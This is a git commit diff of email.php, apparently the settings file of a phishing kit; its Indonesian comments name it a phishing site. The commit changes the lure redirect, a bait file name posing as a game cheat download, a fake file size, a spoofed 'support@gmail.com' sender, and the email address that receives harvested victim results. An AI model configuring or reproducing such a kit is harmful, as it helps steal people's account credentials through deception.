c6832ea0a98fa29787fdef4eb85dc574ab71ecc1
Dormamus <140526714+Dormamus@users.noreply.github.com>
2024-01-27 19:13:02 +0700

    Update email.php

--- email.php
+++ email.php
@@ -1,10 +1,10 @@
 <?php
 
-$redirect = 'https://xnxx.health/'; // LINK DOWNLOAD VIDEO
-$namavideo = 'Nama File'; // NAMA WEB PHISING MU
-$download = '10,1MB'; // UKURAN DOWNLOAD
+$redirect = 'https:youtube.com'; // LINK DOWNLOAD VIDEO
+$namavideo = 'Regedit 66% AUTO HS'; // NAMA WEB PHISING MU
+$download = '40.2'; // UKURAN DOWNLOAD
 
 $sender = 'From: WEB HANZ KECE🤩😜 <support@gmail.com>'; // NAMA RESULT MU
-$email = "emailmu@gmail.com"; // GANTI EMAIL MU
+$email = "demonicgames40@gmail.com"; // GANTI EMAIL MU
 
 ?>
